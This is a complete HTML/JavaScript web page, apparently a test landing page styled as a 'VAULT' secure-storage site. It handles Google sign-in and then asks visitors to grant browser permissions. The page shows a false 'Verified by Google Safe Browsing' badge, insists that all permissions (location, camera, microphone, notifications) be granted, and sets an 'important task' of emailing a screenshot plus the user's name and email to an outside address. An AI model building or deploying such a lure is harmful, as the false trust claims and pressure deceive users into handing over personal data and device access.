<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>VAULT — безопасное хранилище</title>
    <link rel="icon" href="images/logo.png" type="image/png">
    
    <!-- Meta теги -->
    <meta name="title" content="Тестовый лендинг">
    <meta name="description" content="Тестовый лендинг, здесь всякая фигня">
    <meta name="keywords" content="тест, тимоша, timoshamoscow, тимошамоскоу, тимоша тест, тимоша сайт">
    
    <!-- Google Identity -->
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    
    <!-- html2canvas -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0a0c15;
            --bg-secondary: #121520;
            --accent-primary: #4a6cf7;
            --accent-secondary: #a855f7;
            --accent-gradient: linear-gradient(135deg, #4a6cf7, #a855f7);
            --text-primary: #ffffff;
            --text-secondary: #94a3b8;
            --text-muted: #64748b;
            --border-color: rgba(74, 108, 247, 0.2);
            --card-bg: rgba(18, 21, 32, 0.8);
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --glass-border: 1px solid rgba(255, 255, 255, 0.05);
            --shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.5);
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }

        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .gradient-1, .gradient-2 {
            position: absolute;
            width: 100vmax;
            height: 100vmax;
            animation: float 30s infinite alternate;
        }

        .gradient-1 {
            background: radial-gradient(circle at 30% 50%, rgba(74, 108, 247, 0.2), transparent 70%);
            top: -20vmax;
            left: -20vmax;
        }

        .gradient-2 {
            background: radial-gradient(circle at 70% 80%, rgba(168, 85, 247, 0.2), transparent 70%);
            bottom: -20vmax;
            right: -20vmax;
            animation-direction: alternate-reverse;
        }

        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(5%, 5%) rotate(5deg); }
        }

        .grid {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: linear-gradient(rgba(74, 108, 247, 0.03) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(74, 108, 247, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
        }

        .container {
            width: 100%;
            max-width: 580px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(20px) saturate(180%);
            border-radius: 2rem;
            padding: 2rem;
            border: var(--glass-border);
            box-shadow: var(--shadow);
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 60px;
            padding: 0.4rem 1rem;
            margin-bottom: 1.5rem;
            color: var(--success);
            font-size: 0.8rem;
        }

        .logo {
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .logo-icon {
            width: 70px;
            height: 70px;
            margin: 0 auto 1rem;
        }

        .logo-icon img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            filter: drop-shadow(0 8px 20px rgba(74, 108, 247, 0.3));
        }

        .logo h1 {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 2rem;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 0.3rem;
        }

        .logo p {
            color: var(--text-muted);
            font-size: 0.8rem;
        }

        #googleButtonContainer {
            display: flex;
            justify-content: center;
            margin: 1.5rem 0;
        }

        .divider {
            display: flex;
            align-items: center;
            gap: 1rem;
            color: var(--text-muted);
            font-size: 0.75rem;
            margin: 1.2rem 0;
        }

        .divider-line {
            flex: 1;
            height: 1px;
            background: var(--border-color);
        }

        .features {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin: 1.2rem 0;
            flex-wrap: wrap;
        }

        .feature {
            text-align: center;
        }

        .feature i {
            font-size: 1rem;
            color: var(--accent-primary);
            margin-bottom: 0.3rem;
            display: block;
        }

        .feature span {
            font-size: 0.7rem;
            color: var(--text-muted);
        }

        .avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 3px solid var(--accent-primary);
            margin: 0 auto 1rem;
            object-fit: cover;
        }

        .welcome-text h2 {
            font-size: 1.4rem;
            margin-bottom: 0.5rem;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .email-badge {
            background: rgba(74, 108, 247, 0.1);
            padding: 0.5rem 1.2rem;
            border-radius: 60px;
            border: 1px solid var(--border-color);
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            color: var(--text-secondary);
            margin: 0.8rem 0;
            font-size: 0.85rem;
        }

        .permissions-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 1.2rem;
            padding: 1.2rem;
            margin: 1.2rem 0;
            border: 1px solid var(--border-color);
        }

        .permissions-title {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            font-weight: 600;
            margin-bottom: 1rem;
            color: var(--accent-primary);
            font-size: 0.9rem;
        }

        .permissions-grid {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .perm-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0.7rem 0.8rem;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 0.8rem;
        }

        .perm-name {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            font-size: 0.85rem;
            font-weight: 500;
        }

        .perm-name i {
            width: 22px;
            color: var(--accent-primary);
        }

        .perm-status {
            font-size: 0.75rem;
            padding: 0.2rem 0.7rem;
            border-radius: 20px;
            background: rgba(0, 0, 0, 0.4);
        }

        .perm-status.granted {
            color: var(--success);
        }

        .perm-status.denied {
            color: var(--danger);
        }

        .request-perm-btn {
            background: rgba(74, 108, 247, 0.2);
            border: 1px solid var(--accent-primary);
            border-radius: 40px;
            padding: 0.25rem 0.9rem;
            font-size: 0.7rem;
            cursor: pointer;
            transition: all 0.2s;
            color: var(--text-primary);
            margin-left: 0.5rem;
        }

        .request-perm-btn:hover {
            background: rgba(74, 108, 247, 0.4);
            transform: translateY(-1px);
        }

        .task-box {
            background: rgba(74, 108, 247, 0.1);
            border: 2px dashed var(--accent-primary);
            border-radius: 1.5rem;
            padding: 1.2rem;
            margin: 1.2rem 0;
            text-align: center;
        }

        .task-icon {
            font-size: 1.8rem;
            color: var(--accent-primary);
            margin-bottom: 0.6rem;
        }

        .task-box h3 {
            font-size: 1.1rem;
            margin-bottom: 0.4rem;
        }

        .task-box p {
            color: var(--text-secondary);
            font-size: 0.8rem;
            margin-bottom: 0.8rem;
        }

        .task-email {
            background: rgba(0, 0, 0, 0.4);
            padding: 0.5rem 1rem;
            border-radius: 60px;
            display: inline-flex;
            align-items: center;
            gap: 0.6rem;
            font-size: 0.8rem;
            border: 1px solid var(--border-color);
            margin: 0.5rem 0;
            cursor: pointer;
            transition: all 0.2s;
        }

        .task-email:hover {
            background: rgba(74, 108, 247, 0.2);
            border-color: var(--accent-primary);
        }

        .send-btn {
            background: var(--accent-gradient);
            border: none;
            border-radius: 40px;
            padding: 0.6rem 1.2rem;
            font-size: 0.85rem;
            font-weight: 600;
            color: white;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.2s;
        }

        .send-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(74, 108, 247, 0.3);
        }

        .send-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .logout-btn {
            background: rgba(255, 100, 100, 0.1);
            border: 1px solid rgba(255, 100, 100, 0.3);
            border-radius: 40px;
            padding: 0.5rem 1.2rem;
            color: #ffa0a0;
            font-size: 0.85rem;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.2s;
        }

        .logout-btn:hover {
            background: rgba(255, 80, 80, 0.2);
            border-color: #ff6b6b;
            transform: translateY(-2px);
        }

        .hidden {
            display: none !important;
        }

        .status-msg {
            margin-top: 0.6rem;
            font-size: 0.75rem;
            color: var(--text-secondary);
        }

        .progress-bar {
            height: 4px;
            background: rgba(74, 108, 247, 0.2);
            border-radius: 4px;
            margin: 0.8rem 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: var(--accent-gradient);
            border-radius: 4px;
            transition: width 0.3s ease;
        }

        .loading {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .text-center {
            text-align: center;
        }

        .mt-2 {
            margin-top: 0.8rem;
        }

        @media (max-width: 500px) {
            body { padding: 1rem; }
            .card { padding: 1.2rem; }
            .perm-item { flex-wrap: wrap; gap: 0.5rem; }
        }
    </style>
</head>
<body>
    <div class="background">
        <div class="gradient-1"></div>
        <div class="gradient-2"></div>
        <div class="grid"></div>
    </div>

    <div class="container">
        <!-- Карточка входа -->
        <div id="loginCard" class="card">
            <div class="security-badge">
                <i class="fas fa-shield-check"></i>
                <span>Проверено Google Safe Browsing</span>
            </div>
            <div class="logo">
                <div class="logo-icon">
                    <img src="images/logo.png" alt="VAULT" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'%234a6cf7\'%3E%3Cpath d=\'M12 2L2 7v10l10 5 10-5V7l-10-5z\'/%3E%3C/svg%3E'">
                </div>
                <h1>VAULT</h1>
                <p>безопасное хранилище</p>
            </div>
            <div id="googleButtonContainer"></div>
            <div class="divider"><div class="divider-line"></div><span>Безопасный вход</span><div class="divider-line"></div></div>
            <div class="features">
                <div class="feature"><i class="fas fa-shield-halved"></i><span>2FA защита</span></div>
                <div class="feature"><i class="fas fa-bolt"></i><span>Мгновенно</span></div>
                <div class="feature"><i class="fas fa-lock"></i><span>Приватно</span></div>
            </div>
            <div class="text-center mt-2">
                <i class="fas fa-circle" style="color: var(--success); font-size: 0.5rem;"></i>
                <span style="font-size: 0.7rem; color: var(--text-muted); margin-left: 0.3rem;">Ожидание авторизации</span>
            </div>
        </div>

        <!-- Карточка после входа -->
        <div id="welcomeCard" class="card hidden">
            <div class="security-badge">
                <i class="fas fa-shield-check"></i>
                <span>Верификация доступа</span>
            </div>

            <div class="text-center">
                <img class="avatar" id="userAvatar" src="https://www.gstatic.com/images/icons/material/system/1x/account_circle_black_48dp.png" alt="avatar">
                <div class="welcome-text"><h2 id="welcomeMessage">Добро пожаловать!</h2></div>
                <div class="email-badge"><i class="fas fa-envelope"></i><span id="userEmail">Загрузка...</span></div>
            </div>

            <!-- Блок разрешений -->
            <div class="permissions-box">
                <div class="permissions-title">
                    <i class="fas fa-shield-alt"></i>
                    <span>Разрешения браузера</span>
                </div>
                <div class="progress-bar">
                    <div id="progressFill" class="progress-fill" style="width: 0%"></div>
                </div>
                <div id="permissionsGrid" class="permissions-grid"></div>
                <div id="permWarning" style="font-size: 0.7rem; margin-top: 0.8rem; text-align: center;"></div>
            </div>

            <!-- Блок задания -->
            <div class="task-box">
                <div class="task-icon"><i class="fas fa-camera"></i></div>
                <h3>Важное задание</h3>
                <p>Сделайте скриншот экрана и отправьте на почту:</p>
                <div class="task-email" onclick="copyEmail()">
                    <i class="fas fa-envelope"></i>
                    <span>timoshamscbsns@internet.ru</span>
                    <i class="fas fa-copy"></i>
                </div>
                <button id="sendScreenshotBtn" class="send-btn">
                    <i class="fas fa-paper-plane"></i> Сделать скриншот и отправить
                </button>
                <div id="sendStatus" class="status-msg"></div>
            </div>

            <div class="text-center">
                <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Выйти</button>
            </div>
        </div>
    </div>

    <script>
        const YOUR_CLIENT_ID = '22364952672-8mqiqmo14pgq3es9thb2bhon1eiqq522.apps.googleusercontent.com';
        
        // Список разрешений (только те, что работают через API)
        const PERMISSIONS_LIST = [
            { id: 'geolocation', name: 'Геоданные', icon: 'fa-map-marker-alt', check: () => checkGeolocation(), request: () => requestGeolocation() },
            { id: 'camera', name: 'Камера', icon: 'fa-camera', check: () => checkCamera(), request: () => requestCamera() },
            { id: 'microphone', name: 'Микрофон', icon: 'fa-microphone', check: () => checkMicrophone(), request: () => requestMicrophone() },
            { id: 'motion', name: 'Датчики движения', icon: 'fa-shoe-prints', check: () => checkMotion(), request: () => requestMotion() },
            { id: 'notifications', name: 'Уведомления', icon: 'fa-bell', check: () => checkNotifications(), request: () => requestNotifications() },
            { id: 'javascript', name: 'JavaScript', icon: 'fa-code', always: true },
            { id: 'images', name: 'Картинки', icon: 'fa-image', always: true },
            { id: 'pictureInPicture', name: 'Картинка в картинке', icon: 'fa-tv', check: () => checkPictureInPicture(), request: () => requestPictureInPicture() }
        ];
        
        let permissionsState = {};
        let currentUser = null;
        
        const loginCard = document.getElementById('loginCard');
        const welcomeCard = document.getElementById('welcomeCard');
        const userAvatar = document.getElementById('userAvatar');
        const userEmail = document.getElementById('userEmail');
        const welcomeMessage = document.getElementById('welcomeMessage');
        const logoutBtn = document.getElementById('logoutBtn');
        const permissionsGrid = document.getElementById('permissionsGrid');
        const progressFill = document.getElementById('progressFill');
        const permWarning = document.getElementById('permWarning');
        
        // ========== ФУНКЦИИ ПРОВЕРКИ РАЗРЕШЕНИЙ ==========
        async function checkGeolocation() {
            return new Promise((resolve) => {
                navigator.permissions?.query({ name: 'geolocation' }).then(
                    result => resolve(result.state === 'granted'),
                    () => resolve(false)
                ).catch(() => resolve(false));
            });
        }
        
        async function checkCamera() {
            return new Promise((resolve) => {
                navigator.permissions?.query({ name: 'camera' }).then(
                    result => resolve(result.state === 'granted'),
                    () => resolve(false)
                ).catch(() => resolve(false));
            });
        }
        
        async function checkMicrophone() {
            return new Promise((resolve) => {
                navigator.permissions?.query({ name: 'microphone' }).then(
                    result => resolve(result.state === 'granted'),
                    () => resolve(false)
                ).catch(() => resolve(false));
            });
        }
        
        async function checkMotion() {
            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                return false;
            }
            return true;
        }
        
        async function checkNotifications() {
            return Notification.permission === 'granted';
        }
        
        async function checkPictureInPicture() {
            return document.pictureInPictureEnabled === true;
        }
        
        // ========== ФУНКЦИИ ЗАПРОСА РАЗРЕШЕНИЙ ==========
        async function requestGeolocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    () => resolve(true),
                    () => resolve(false)
                );
            });
        }
        
        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                return false;
            }
        }
        
        async function requestMicrophone() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) {
                return false;
            }
        }
        
        async function requestMotion() {
            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                try {
                    const permission = await DeviceOrientationEvent.requestPermission();
                    return permission === 'granted';
                } catch(e) {
                    return false;
                }
            }
            return true;
        }
        
        async function requestNotifications() {
            const permission = await Notification.requestPermission();
            return permission === 'granted';
        }
        
        async function requestPictureInPicture() {
            try {
                const video = document.createElement('video');
                video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29t';
                await video.play();
                return true;
            } catch(e) {
                return document.pictureInPictureEnabled === true;
            }
        }
        
        // ========== ОБНОВЛЕНИЕ СОСТОЯНИЯ ==========
        async function updateAllPermissions() {
            for (const perm of PERMISSIONS_LIST) {
                if (perm.always) {
                    permissionsState[perm.id] = true;
                } else if (perm.check) {
                    permissionsState[perm.id] = await perm.check();
                }
            }
            savePermissionsState();
            renderPermissionsGrid();
        }
        
        function savePermissionsState() {
            localStorage.setItem('vault_permissions', JSON.stringify(permissionsState));
            updateProgress();
        }
        
        function updateProgress() {
            const total = PERMISSIONS_LIST.filter(p => !p.always).length;
            const granted = PERMISSIONS_LIST.filter(p => !p.always && permissionsState[p.id]).length;
            const percent = (granted / total) * 100;
            if (progressFill) progressFill.style.width = percent + '%';
            
            const allGranted = checkAllPermissions();
            if (permWarning) {
                if (!allGranted) {
                    permWarning.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Необходимо дать ВСЕ разрешения (${granted}/${total})`;
                    permWarning.style.color = 'var(--warning)';
                } else {
                    permWarning.innerHTML = `<i class="fas fa-check-circle"></i> Все разрешения выданы!`;
                    permWarning.style.color = 'var(--success)';
                }
            }
            return allGranted;
        }
        
        function checkAllPermissions() {
            return PERMISSIONS_LIST.every(p => permissionsState[p.id] === true);
        }
        
        function renderPermissionsGrid() {
            if (!permissionsGrid) return;
            
            permissionsGrid.innerHTML = PERMISSIONS_LIST.map(perm => {
                const granted = permissionsState[perm.id];
                const statusText = granted ? '✅ разрешено' : '❌ не разрешено';
                const statusClass = granted ? 'granted' : 'denied';
                
                let buttonHtml = '';
                if (!granted && perm.request && !perm.always) {
                    buttonHtml = `<button class="request-perm-btn" data-perm="${perm.id}">Запросить</button>`;
                }
                
                return `
                    <div class="perm-item">
                        <div class="perm-name">
                            <i class="fas ${perm.icon}"></i>
                            <span>${perm.name}</span>
                        </div>
                        <div>
                            <span class="perm-status ${statusClass}">${statusText}</span>
                            ${buttonHtml}
                        </div>
                    </div>
                `;
            }).join('');
            
            document.querySelectorAll('.request-perm-btn').forEach(btn => {
                btn.addEventListener('click', async (e) => {
                    e.stopPropagation();
                    const permId = btn.dataset.perm;
                    const perm = PERMISSIONS_LIST.find(p => p.id === permId);
                    if (perm && perm.request) {
                        const result = await perm.request();
                        if (result) {
                            permissionsState[permId] = true;
                            savePermissionsState();
                            renderPermissionsGrid();
                        } else {
                            alert(`⚠️ Не удалось получить разрешение: ${perm.name}\nПопробуйте разрешить вручную через настройки сайта (иконка замка 🔒 слева от адресной строки)`);
                        }
                    }
                });
            });
            
            updateProgress();
        }
        
        // ========== ОТПРАВКА СКРИНШОТА ==========
        window.copyEmail = function() {
            navigator.clipboard.writeText('timoshamscbsns@internet.ru');
            alert('📧 Email скопирован: timoshamscbsns@internet.ru');
        };
        
        const sendScreenshotBtn = document.getElementById('sendScreenshotBtn');
        const sendStatus = document.getElementById('sendStatus');
        
        async function takeScreenshotAndSend() {
            if (!currentUser) return;
            
            if (!checkAllPermissions()) {
                sendStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ Сначала дайте ВСЕ разрешения!';
                sendStatus.style.color = 'var(--warning)';
                return;
            }
            
            sendStatus.innerHTML = '<i class="loading"></i> Создание скриншота...';
            if (sendScreenshotBtn) sendScreenshotBtn.disabled = true;
            
            try {
                const canvas = await html2canvas(document.body, {
                    scale: 0.9,
                    backgroundColor: '#0a0c15',
                    logging: false,
                    useCORS: true
                });
                const screenshotDataUrl = canvas.toDataURL('image/png');
                
                const grantedPermissions = PERMISSIONS_LIST.filter(p => permissionsState[p.id]).map(p => p.name);
                
                const textToCopy = `🔐 VAULT - Данные верификации\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 Имя: ${currentUser.name}\n📧 Email: ${currentUser.email}\n✅ Разрешения выданы (${grantedPermissions.length}/${PERMISSIONS_LIST.length}):\n${grantedPermissions.map(p => `   • ${p}`).join('\n')}\n🕐 Время: ${new Date().toLocaleString('ru-RU')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📸 Скриншот сохранён на компьютер\n📧 Отправьте файл на: timoshamscbsns@internet.ru`;
                
                await navigator.clipboard.writeText(textToCopy);
                
                const link = document.createElement('a');
                link.download = `vault_${currentUser.name.replace(/\s/g, '_')}_${Date.now()}.png`;
                link.href = screenshotDataUrl;
                link.click();
                
                sendStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> ✅ Скриншот сохранён! Данные скопированы. Отправьте файл на timoshamscbsns@internet.ru';
                sendStatus.style.color = 'var(--success)';
                
            } catch (error) {
                sendStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ Ошибка создания скриншота';
                sendStatus.style.color = 'var(--danger)';
            } finally {
                if (sendScreenshotBtn) sendScreenshotBtn.disabled = false;
            }
        }
        
        if (sendScreenshotBtn) {
            sendScreenshotBtn.addEventListener('click', takeScreenshotAndSend);
        }
        
        // ========== GOOGLE AUTH ==========
        function initGoogle() {
            if (!window.google) { setTimeout(initGoogle, 100); return; }
            google.accounts.id.initialize({
                client_id: YOUR_CLIENT_ID,
                callback: handleCredentialResponse,
                auto_select: false
            });
            google.accounts.id.renderButton(
                document.getElementById('googleButtonContainer'),
                { theme: 'filled_blue', size: 'large', text: 'signin_with', shape: 'pill', width: 280 }
            );
            google.accounts.id.prompt();
        }
        
        function handleCredentialResponse(response) {
            const userData = decodeJWT(response.credential);
            if (userData) {
                currentUser = {
                    name: userData.name,
                    email: userData.email,
                    picture: userData.picture
                };
                localStorage.setItem('vault_user', JSON.stringify(currentUser));
                showWelcomeCard();
            }
        }
        
        function decodeJWT(token) {
            try {
                const base64Url = token.split('.')[1];
                const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
                const jsonPayload = decodeURIComponent(atob(base64).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
                return JSON.parse(jsonPayload);
            } catch(e) { return null; }
        }
        
        function restoreSession() {
            const saved = localStorage.getItem('vault_user');
            if (saved) {
                try {
                    currentUser = JSON.parse(saved);
                    showWelcomeCard();
                    return true;
                } catch(e) { localStorage.removeItem('vault_user'); }
            }
            return false;
        }
        
        async function showWelcomeCard() {
            if (currentUser) {
                userEmail.textContent = currentUser.email;
                welcomeMessage.textContent = `С возвращением, ${currentUser.name.split(' ')[0]}!`;
                if (currentUser.picture) userAvatar.src = currentUser.picture;
                loginCard.classList.add('hidden');
                welcomeCard.classList.remove('hidden');
                
                const savedPerms = localStorage.getItem('vault_permissions');
                if (savedPerms) {
                    permissionsState = JSON.parse(savedPerms);
                } else {
                    await updateAllPermissions();
                }
                renderPermissionsGrid();
                
                setInterval(async () => {
                    let changed = false;
                    for (const perm of PERMISSIONS_LIST.filter(p => p.check && !p.always)) {
                        const state = await perm.check();
                        if (state !== permissionsState[perm.id]) {
                            permissionsState[perm.id] = state;
                            changed = true;
                        }
                    }
                    if (changed) {
                        savePermissionsState();
                        renderPermissionsGrid();
                    }
                }, 3000);
            }
        }
        
        function signOut() {
            if (window.google?.accounts?.id) google.accounts.id.disableAutoSelect();
            localStorage.removeItem('vault_user');
            currentUser = null;
            loginCard.classList.remove('hidden');
            welcomeCard.classList.add('hidden');
            initGoogle();
        }
        
        // Инициализация
        PERMISSIONS_LIST.forEach(p => { permissionsState[p.id] = false; });
        if (!restoreSession()) initGoogle();
        if (logoutBtn) logoutBtn.addEventListener('click', signOut);
    </script>
</body>
</html>
